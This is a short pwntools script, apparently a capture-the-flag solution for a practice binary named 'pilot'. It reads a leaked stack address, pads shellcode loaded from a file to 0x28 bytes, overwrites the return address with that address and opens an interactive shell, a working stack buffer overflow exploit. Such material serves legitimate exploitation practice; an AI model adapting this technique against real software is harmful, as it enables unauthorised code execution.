from pwn import *

context.terminal = [ "wt.exe", "-w", "0", "sp", "--", "wsl.exe", "--" ]
target = process("./pilot")
# target = gdb.debug("./pilot", "catch syscall read")
target.recvuntil(b"Location:")
str = int(target.recvline().strip(), 16)
print(hex(str))
f = open("test.bin", "rb")
payload = f.read()
print(payload)
# payload = b""
assert(len(payload) <= 0x28)
payload += (0x28 - len(payload)) * b"A"
payload += p64(str)
target.sendline(payload)
target.interactive()
